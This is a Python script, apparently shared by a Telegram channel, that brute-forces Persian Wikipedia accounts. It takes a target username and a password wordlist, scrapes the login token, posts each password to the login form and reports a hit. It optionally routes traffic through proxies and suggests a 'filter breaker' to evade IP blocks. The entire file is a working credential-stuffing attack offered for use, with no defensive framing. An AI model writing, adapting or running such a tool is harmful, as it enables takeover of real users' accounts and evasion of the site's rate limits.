#This tool supports proxy socks4&5 , http&+s| It uses your cookie to send requests and persistence | channel : @EsFeLuRm
import os
try:
    import requests, platform,colorama
    from bs4 import BeautifulSoup
except:
	os.system("pip install requests && colorama && bs4")
rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn = '\033[00;36m'
if 'Windows' in platform.uname() or 'windows' in platform.uname():
	colorama.init()
else:
    pass

print (f"""
{lrd}
                            
                  )       
 (  (     (    ( /(   (   
 )\))(    )\   )\())  )\  
((_)()\  ((_) ((_)\  ((_) 
{lgn}_{lrd}(()(({lgn}_{lrd})  ({lgn}_{lrd}) {lgn}| |{lrd}({lgn}_{lrd})  ({lgn}_{lrd}){lgn} 
\ V  V /  | | | / /   | | 
 \_/\_/   |_| |_\_\   |_|                           
                                         {lrd}Telegram : {lgn}@Esfelurm{lrd}
   (  github.com/esfelurm  )           {yw}-------------------------{lrd}
                                      {lgn}wikipedia(Fa account cracker{lrd}          
   )\    (        )         ( /(  
 (((_)   )(    ( /(    (    )\()) 
 )\{lgn}___ {lrd} (()\   )(_{lrd}))   )\  (({lgn}_{lrd})\  
(({lgn}/ __|  {lrd}(({lgn}_{lrd}) (({lgn}_{lrd}){lgn}_   {lrd}((_{lrd}){lgn} | |{lrd}({lgn}_{lrd}) {lgn}
 | (__  | '_| / _` | / _|  | / /  
  \___| |_|   \__,_| \__|  |_\_\  
                                  

""")

User = input(f"{lrd}[{lgn}*{lrd}]{cn} Enter Username Target : {pe}")
Password = input(f"\n{lrd}[{lgn}*{lrd}]{cn} Enter Name passwordlist File : {pe}")
pas = open(Password,'r')
P = input(f"\n{lrd}[{lgn}*{lrd}]{cn} Do you use a proxy {lgn}[y/n] : {pe}")
if P == 'y' or P == 'Y':
    P2 = input(f"{lrd}[{lgn}*{lrd}]{cn} Enter the proxy type {lrd}[{lgn}socks4,socks5,http,https{lrd}] : {pe}")
    Proxy = input(f"\n{lrd}[{lgn}*{lrd}]{cn} Enter Name Proxy List : {pe}")
    Pr = open(Proxy,'r')
    for PROXY in Pr:
	    pass
else:
	pass

print (f"\n{gn}--------------------------------\n")

url = 'https://fa.m.wikipedia.org/wiki/%D9%88%DB%8C%DA%98%D9%87:%D9%88%D8%B1%D9%88%D8%AF_%D8%A8%D9%87_%D8%B3%D8%A7%D9%85%D8%A7%D9%86%D9%87'

headers =  {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.5',
'Connection': 'keep-alive',
'Content-Length': '147',
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'fa.wikipedia.org',
'Origin': 'https://fa.wikipedia.org',
'Referer': 'https://fa.wikipedia.org/w/index.php?title=%D9%88%DB%8C%DA%98%D9%87:%D9%88%D8%B1%D9%88%D8%AF&returnto=%D8%B5%D9%81%D8%AD%D9%87%E2%80%8C%D8%A7%D8%B5%D9%84%DB%8C',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36'
 }
s = requests.Session()
response = s.get(url, headers=headers)
soup = BeautifulSoup(response.text, 'html.parser')
wp_login_token = soup.find('input', {'name': 'wpLoginToken'})['value']

login_cookies = {}
for cookie in s.cookies:
    if cookie.name.startswith('WMF-') or cookie.name.startswith('GeoIP'):
        login_cookies[cookie.name] = cookie.value
        
for Pas in pas:
    payload = {
    'wpName': User,
    'wpPassword': Pas,
    'wploginattempt': 'ورود+به+سامانه',
    'wpEditToken': '+\\',
    'title': 'ویژه:ورود+به+سامانه',
    'wpRemember': '1',
    'geEnabled': '-1',
    'authAction': 'login',
    'force': 'true',
    'wpLoginToken': wp_login_token}
    if P == 'y' or P == 'Y':
        response = requests.post(url, headers=headers, data=payload,cookies=login_cookies,proxies={P2:PROXY})
    else:
    	response = requests.post(url, headers=headers, data=payload)
    	
    soup = BeautifulSoup(response.text, 'html.parser')
    error_msg = soup.find(class_='mw-message-box-error').get_text()
    
    #print (error_msg)
    if error_msg not in response.text:
     print (f"{lrd}[{lgn}√{lrd}] {lgn}Correct password : {cn}{Pas}")
     break
     
    if "به نظر می‌رسد مشکلی در مورد نشست کاربری شما وجود دارد؛\nعمل درخواست شده در اقدامی پیشگیرانه در برابر ربوده‌شدن اطلاعات نشست کاربری، لغو شد." in response.text:
     print (f"{lrd}[{yw}×{lrd}] {rd}password is wrong : {lrd}{Pas}")
     
    if "شما به تازگی چندین‌بار برای ثبت ورود تلاش کرده‌اید. لطفاً پیش از آنکه دوباره تلاش کنید ۵ دقیقه صبر کنید." in response.text:
    	print (f"{lrd}[{yw}×{lrd}]{cn} Your IP has been blocked by the server! Please test in 10 minutes or test with a filter breaker !")
    	break
    
